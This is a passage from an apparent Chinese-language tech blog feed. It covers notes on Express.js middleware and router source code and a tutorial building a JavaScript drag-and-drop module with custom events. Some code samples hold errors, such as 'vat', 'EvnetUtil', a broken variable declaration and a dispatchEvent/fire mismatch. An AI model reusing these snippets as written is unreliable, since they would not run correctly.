punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// define the about route</span>router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/about'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'About birds'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> birds <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./api'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//...</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/api'</span><span class="token punctuation">,</span> birds<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul></li></ul><p><em>note: <a href="http://www.expressjs.com.cn/resources/middleware.html" target="_blank" rel="noopener">支持的中间件</a></em></p><h4 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h4><p>express内部维护一个函数数组，这个函数数组表示在返回响应之前要执行的函数，也就是中间件数组，每次使用<code>use</code>将中间件推入数组；如果当前中间件没有终结请求-响应循环，则必须调用 <code>next()</code>方法将控制权交给下一个中间件，否则请求就会挂起</p><h4 id="源码学习"><a href="#源码学习" class="headerlink" title="源码学习"></a>源码学习</h4><ul><li><p>目录结构<br><img src="/img/in-post/express-00.JPG" alt="源码目录结构"></p></li><li><p>入口 <code>express.js</code> : 创建express应用</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">createApplication</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">/** * @desc 使用工厂模式创建一个express的实例对象，将控制移交给handle */</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  app<span class="token punctuation">.</span><span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @desc 将 EventEmitter.prototype 和 application功能导入app * mixin不会改变目标对象的原型，会在原有对象基础上增加（混入）新的属性 */</span><span class="token function">mixin</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> EventEmitter<span class="token punctuation">.</span>prototype<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mixin</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> proto<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Object.create创建一个指定原型和若干属性的新对象</span>app<span class="token punctuation">.</span>request <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> <span class="token punctuation">{</span>  app<span class="token punctuation">:</span> <span class="token punctuation">{</span> configurable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> enumerable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> writable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> value<span class="token punctuation">:</span> app <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 继承response模块功能</span>app<span class="token punctuation">.</span>response <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token punctuation">{</span>  app<span class="token punctuation">:</span> <span class="token punctuation">{</span> configurable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> enumerable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> writable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> value<span class="token punctuation">:</span> app <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> app<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li><p><code>application.js</code>：配置基本设置，配置默认中间件，配置路由映射方法</p></li><li><code>middleware</code>：中间件<ul><li><code>index.js</code>：初始化req, res</li><li><code>query.js</code>：将url参数解析为对象形式并赋值给<code>req.query</code><pre class=" language-javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">query</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> opts <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token keyword">var</span> queryparse <span class="token operator">=</span> qs<span class="token punctuation">.</span>parse<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> options <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  queryparse <span class="token operator">=</span> options<span class="token punctuation">;</span>  opts <span class="token operator">=</span> undefined<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>opts <span class="token operator">!==</span> undefined <span class="token operator">&amp;&amp;</span> opts<span class="token punctuation">.</span>allowPrototypes <span class="token operator">===</span> undefined<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// back-compat for qs module</span>  opts<span class="token punctuation">.</span>allowPrototypes <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token function">query</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>query<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> val <span class="token operator">=</span> <span class="token function">parseUrl</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">.</span>query<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将url解析为对象格式，提取query值</span>    req<span class="token punctuation">.</span>query <span class="token operator">=</span> <span class="token function">queryparse</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将参数解析为对象格式</span>  <span class="token punctuation">}</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></li></ul></li><li><p><code>router</code>: 路由相关</p><ul><li><p><code>index.js</code>：Router类</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> proto <span class="token operator">=</span> module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> opts <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">router</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  router<span class="token punctuation">.</span><span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// mixin Router class functions</span><span class="token function">setPrototypeOf</span><span class="token punctuation">(</span>router<span class="token punctuation">,</span> proto<span class="token punctuation">)</span>router<span class="token punctuation">.</span>params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span>_params <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span>caseSensitive <span class="token operator">=</span> opts<span class="token punctuation">.</span>caseSensitive<span class="token punctuation">;</span>router<span class="token punctuation">.</span>mergeParams <span class="token operator">=</span> opts<span class="token punctuation">.</span>mergeParams<span class="token punctuation">;</span>router<span class="token punctuation">.</span>strict <span class="token operator">=</span> opts<span class="token punctuation">.</span>strict<span class="token punctuation">;</span>router<span class="token punctuation">.</span>stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> router<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></li><li><p><code>layer.js</code>：保存路由中间件实体信息</p><pre class=" language-javascript"><code class="language-javascript">methods<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">{</span>Route<span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>method<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> handles <span class="token operator">=</span> <span class="token function">flatten</span><span class="token punctuation">(</span>slice<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> handles<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> handle <span class="token operator">=</span> handles<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> handle <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> type <span class="token operator">=</span> toString<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> msg <span class="token operator">=</span> <span class="token string">'Route.'</span> <span class="token operator">+</span> method <span class="token operator">+</span> <span class="token string">'() requires a callback function but got a '</span> <span class="token operator">+</span> type    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">'%s %o'</span><span class="token punctuation">,</span> method<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>path<span class="token punctuation">)</span>  <span class="token keyword">var</span> layer <span class="token operator">=</span> <span class="token function">Layer</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handle<span class="token punctuation">)</span><span class="token punctuation">;</span>  layer<span class="token punctuation">.</span>method <span class="token operator">=</span> method<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>methods<span class="token punctuation">[</span>method<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>layer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><code>route.js</code>：route类，处理不同的method</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> express </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拖放</title>
      <link href="/2018/09/24/tuo-fang/"/>
      <url>/2018/09/24/tuo-fang/</url>
      
        <content type="html"><![CDATA[<h4 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h4><ul><li>拖放是一种非常流行的用户界面模式。它的概念很简单：点击某个对象，并按住鼠标按钮不放，将鼠标移动到另一个区域，然后释放鼠标按钮对象将对象放置到该位置；</li><li>基本概念：创建一个绝对定位的元素，使其可以用鼠标移动。单元素鼠标拖尾的基本代码需要为文档设置一个<code>onmousemove</code>事件处理程序，它总是将指定元素移动到鼠标指针的位置，例子：<pre class=" language-javascript"><code class="language-javascript">EvnetUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">"mousemove"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  vat myDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myDiv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  myDiv<span class="token punctuation">.</span>style<span class="token punctuation">.</span>left <span class="token operator">=</span> event<span class="token punctuation">.</span>clientX <span class="token operator">+</span> <span class="token string">"PX"</span><span class="token punctuation">;</span>  myDiv<span class="token punctuation">.</span>style<span class="token punctuation">.</span>top <span class="token operator">=</span> event<span class="token punctuation">.</span>clientY <span class="token operator">+</span> <span class="token string">"px"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li></ul><h4 id="简单的拖放界面"><a href="#简单的拖放界面" class="headerlink" title="简单的拖放界面"></a>简单的拖放界面</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> DragDrop <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> dragging <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">handleEvent</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>    event <span class="token operator">=</span> EventUtil<span class="token punctuation">.</span><span class="token function">getEvent</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> target <span class="token operator">=</span> EventUtil<span class="token punctuation">.</span><span class="token function">getTarget</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token string">"mousedown"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span>className<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"draggable"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          dragging <span class="token operator">=</span> target<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token string">"mousemove"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>dragging <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          dragging<span class="token punctuation">.</span>style<span class="token punctuation">.</span>left <span class="token operator">=</span> event<span class="token punctuation">.</span>clientX <span class="token operator">+</span> <span class="token string">"px"</span><span class="token punctuation">;</span>          dragging<span class="token punctuation">.</span>style<span class="token punctuation">.</span>top <span class="token operator">=</span> event<span class="token punctuation">.</span>clientY <span class="token operator">+</span> <span class="token string">"px"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token string">"mouseup"</span><span class="token punctuation">:</span>      dragging <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">{</span>    enable<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">"mousedown"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>      EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">"mousemove"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>      EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">"mouseup"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    disable<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      EventUtil<span class="token punctuation">.</span><span class="token function">removeHandler</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">"mousedown"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>      EventUtil<span class="token punctuation">.</span><span class="token function">removeHandler</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">"mousemove"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>      EventUtil<span class="token punctuation">.</span><span class="token function">removeHandler</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">"mouseup"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li>前提：<ul><li><code>class=&quot;draggable&quot;</code></li><li>元素是绝对定位的</li><li>关闭默认的拖放事件<code>target.ondragstart=function(e){e.preventDefault();}</code></li></ul></li></ul><h4 id="修缮拖放功能及自定义事件"><a href="#修缮拖放功能及自定义事件" class="headerlink" title="修缮拖放功能及自定义事件"></a>修缮拖放功能及自定义事件</h4><ul><li>解决元素的左上角总是和指针在一起，保证用户点击点位置和指针保持一致，主要使用 <code>offsetLeft</code>和<code>offsetTop</code>进行计算<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> DragDrop <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> dragdrop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    dragging <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>    diffX <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    diffY <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">handleEvent</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  event <span class="token operator">=</span> EventUtil<span class="token punctuation">.</span><span class="token function">getEvent</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> target <span class="token operator">=</span> EventUtil<span class="token punctuation">.</span><span class="token function">getTarget</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token string">"mousedown"</span><span class="token punctuation">:</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span>className<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"draggable"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dragging <span class="token operator">=</span> target<span class="token punctuation">;</span>        diffX <span class="token operator">=</span> event<span class="token punctuation">.</span>clientX <span class="token operator">-</span> target<span class="token punctuation">.</span>offsetLeft<span class="token punctuation">;</span>        diffY <span class="token operator">=</span> event<span class="token punctuation">.</span>clientY <span class="token operator">-</span> target<span class="token punctuation">.</span>offsetTop<span class="token punctuation">;</span>        dragdrop<span class="token punctuation">.</span><span class="token function">dispatchEvent</span><span class="token punctuation">(</span><span class="token punctuation">{</span>type<span class="token punctuation">:</span> <span class="token string">"dragstart"</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> dragging<span class="token punctuation">,</span> x<span class="token punctuation">:</span> event<span class="token punctuation">.</span>clientX<span class="token punctuation">,</span> y<span class="token punctuation">:</span> event<span class="token punctuation">.</span>clientY<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string">"mousemove"</span><span class="token punctuation">:</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>dragging <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dragging<span class="token punctuation">.</span>style<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>clientX <span class="token operator">-</span> diffX<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"px"</span><span class="token punctuation">;</span>        dragging<span class="token punctuation">.</span>style<span class="token punctuation">.</span>top <span class="token operator">=</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>clientY <span class="token operator">-</span> diffY<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"px"</span><span class="token punctuation">;</span>        dragdrop<span class="token punctuation">.</span><span class="token function">dispatchEvent</span><span class="token punctuation">(</span><span class="token punctuation">{</span>type<span class="token punctuation">:</span> <span class="token string">"drag"</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> dragging<span class="token punctuation">,</span> x<span class="token punctuation">:</span> event<span class="token punctuation">.</span>clientX<span class="token punctuation">,</span> y<span class="token punctuation">:</span> event<span class="token punctuation">.</span>clientY<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string">"mouseup"</span><span class="token punctuation">:</span>    dragdrop<span class="token punctuation">.</span><span class="token function">dispatchEvent</span><span class="token punctuation">(</span><span class="token punctuation">{</span>type<span class="token punctuation">:</span> <span class="token string">"dragend"</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> dragging<span class="token punctuation">,</span> x<span class="token punctuation">:</span> event<span class="token punctuation">.</span>clientX<span class="token punctuation">,</span> y<span class="token punctuation">:</span> event<span class="token punctuation">.</span>clientY<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    dragging <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token punctuation">{</span>  enable<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">"mousedown"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>    EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">"mousemove"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>    EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">"mouseup"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  disable<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    EventUtil<span class="token punctuation">.</span><span class="token function">removeHandler</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">"mousedown"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>    EventUtil<span class="token punctuation">.</span><span class="token function">removeHandler</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">"mousemove"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>    EventUtil<span class="token punctuation">.</span><span class="token function">removeHandler</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">"mouseup"</span><span class="token punctuation">,</span> handleEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul><h4 id="自定义事件"><a href="#自定义事件" class="headerlink" title="自定义事件"></a>自定义事件</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">EventTarget</span> <span class="token punctuation">{</span>  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>handlers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">addHandler</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> handler<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">this</span><span class="token punctuation">.</span>handlers<span class="token punctuation">[</span>type<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>handlers<span class="token punctuation">[</span>type<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>handlers<span class="token punctuation">[</span>type<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">fire</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>event<span class="token punctuation">.</span>target<span class="token punctuation">)</span> <span class="token punctuation">{</span>      event<span class="token punctuation">.</span>target <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>handlers<span class="token punctuation">[</span>event<span class="token punctuation">.</span>type<span class="token punctuation">]</span> <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> handlers <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>handlers<span class="token punctuation">[</span>event<span class="token punctuation">.</span>type<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">=</span> handlers<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        handlers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  